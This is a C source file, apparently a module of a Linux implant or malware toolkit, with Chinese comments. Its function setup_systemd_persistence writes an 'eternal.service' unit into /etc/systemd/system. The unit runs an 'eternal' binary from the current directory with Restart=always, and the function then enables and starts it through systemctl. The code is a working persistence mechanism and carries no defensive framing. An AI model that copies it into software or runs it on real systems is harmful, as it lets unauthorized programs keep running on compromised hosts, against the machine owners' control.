#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "info.h"
#include "linux_persistence_systemd.h"

#ifdef SYSTEMD_MOD
void setup_systemd_persistence() {
    printf("设置systemd持久化...\n");
    const char* systemd_path = "/etc/systemd/system";
    char service_path[512];
    snprintf(service_path, sizeof(service_path), "%s/eternal.service", systemd_path);

    // 阶段 1: 检查文件存在性和写入权限
    if (access(systemd_path, W_OK) != 0) {
        perror("没有写权限到systemd系统目录");
        return;
    }

    // 检查是否可以创建服务文件
    FILE *test_file = fopen(service_path, "w");
    if (!test_file) {
        perror("无法创建systemd服务文件");
        return;
    }
    fclose(test_file);  // 确认可以创建后立即关闭文件

    // 阶段 2: 执行写入操作
    FILE *service_file = fopen(service_path, "w");
    if (service_file) {
        fprintf(service_file, "[Unit]\n");
        fprintf(service_file, "Description=Eternal Service\n");
        fprintf(service_file, "After=network.target\n\n");

        fprintf(service_file, "[Service]\n");
        char* current_dir = getcwd(NULL, 0);
        if (current_dir) {
            fprintf(service_file, "ExecStart=%s/eternal\n", current_dir); // 添加当前目录下的 eternal 可执行文件路径
            free(current_dir);
        } else {
            fclose(service_file);
            perror("无法获取当前目录");
            return;
        }
        fprintf(service_file, "Restart=always\n\n");

        fprintf(service_file, "[Install]\n");
        fprintf(service_file, "WantedBy=multi-user.target\n");
        fclose(service_file);

        // Reload systemd to recognize the new service, enable and start it
        system("systemctl daemon-reload");
        system("systemctl enable eternal.service");
        system("systemctl start eternal.service");

        printf("持久化命令已添加到systemd。\n");
    } else {
        perror("无法打开systemd服务文件进行写入");
    }
}
#endif
